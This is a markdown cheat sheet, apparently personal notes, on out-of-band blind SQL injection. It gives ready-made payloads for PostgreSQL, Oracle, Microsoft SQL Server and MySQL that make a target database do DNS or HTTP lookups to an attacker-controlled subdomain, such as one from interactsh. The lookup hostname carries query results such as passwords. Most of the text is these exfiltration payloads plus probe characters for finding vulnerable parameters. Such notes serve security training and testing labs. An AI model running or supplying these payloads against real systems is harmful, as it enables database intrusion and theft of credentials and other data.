
## Out of Band Interaction SQLi

- Out of Band Interaction SQLi is a type of Blind SQLi where the attacker doesn't receive the result in the same communication channel but instead is able to cause the application to send data to remote location/server/endpoint that the attacker controls. 
- **WORKING**
	-  Attacker has a DNS server. In the payload the DNS server domain is mentioned along with the `YOUR QUERY HERE` SQL query so the database tries to communicate with our DNS server because it doesn't know the IP address of the `SUBDOMAIN` we gave hence the DNS lookup.
	- DNS sees that someone is trying to communicate with it and there is a hostname within this hostname is the sensitive information prepended because of the `YOUR QUERY HERE` SQL query you ran as the attacker in the target web application. The message log in the DNS serve might look like this -> `_At 12:00 PM, someone asked for the location of **Secret123**.attacker.com._` Here **Secret123** is the password which we got prepended to the hostname because of the `YOUR QUERY HERE` SQL query we ran.

## 1. Check Parameter Vulnerability

```sql
'
''
/*
find out which parameter is vulnerable to SQLi first.
Insert each payload above to look for database response variation.
The paramter can be a trackingID, sessionID etc...
*/
```


## 2. DNS Lookup

- `SUBDOMAIN` : This is the subdomain where the data will be redirected.
	- [interactsh](https://app.interactsh.com/) -> **Get subdomain from here**. 
- Confirm data exfiltration is possible using DNS lookup and the Out of Band SQLi is present in the application.

```sql
-- PostgreSQL
copy+(SELECT+'')+to+program+'nslookup+SUBDOMAIN'--

-- Oracle
SELECT+UTL_INADDR.get_host_address('SUBDOMAIN')+FROM+dual--

-- Microsoft
exec+master..xp_dirtree+'//SUBDOMAIN/a'--

-- Oracle
SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

## 3. DNS Lookup with Data Exfiltration

- `YOUR QUERY HERE` : This is where you write the SQL query which will extract the password from the user or any query.
- `SUBDOMAIN` : This is the subdomain where the data will be redirected.
- **WORKING**
	- Attacker has a DNS server. In the payload the DNS server domain is mentioned along with the `YOUR QUERY HERE` SQL query so the database tries to communicate with our DNS server because it doesn't know the IP address of the `SUBDOMAIN` we gave hence the DNS lookup.
	- DNS sees that someone is trying to communicate with it and there is a hostname within this hostname is the sensitive information prepended because of the `YOUR QUERY HERE` SQL query you ran as the attacker in the target web application. The message log in the DNS serve might look like this -> `_At 12:00 PM, someone asked for the location of **Secret123**.attacker.com._` Here **Secret123** is the password which we got prepended to the hostname because of the `YOUR QUERY HERE` SQL query we ran.
- You might need to use `'+UNION` and comments `--` with the payloads to display the result.

```sql
-- PostgreSQL
SELECT+into+p+(YOUR-QUERY-HERE);+++c+:=+'copy+(SELECT+'''''''')+to+program+''nslookup+'||p||'.SUBDOMAIN''';+++execute+c;+++END;+++$$+language+plpgsql+security+definer;+++SELECT+f();

-- Microsoft
declare+@p+varchar(1024);set+@p=(YOUR-QUERY-HERE);exec('master..xp_dirtree+"//'+@p+'.SUBDOMAIN/a"')

-- MySQL
--The following technique works on Windows only
SELECT+YOUR-QUERY-HERE+INTO+OUTFILE+'\\\\SUBDOMAIN\a'

-- Oracle
SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://'||(SELECT+YOUR-QUERY-HERE)||'.SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual

/*
IN THE SQL query use + sign to make spaces in the query or else the payload will fail. Also you might need to include '+UNION+ to append multiple SELECT queries and also add the comment lines for exampl (--) to encapsulate the extra (') if there is any.
*/
```

---
## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

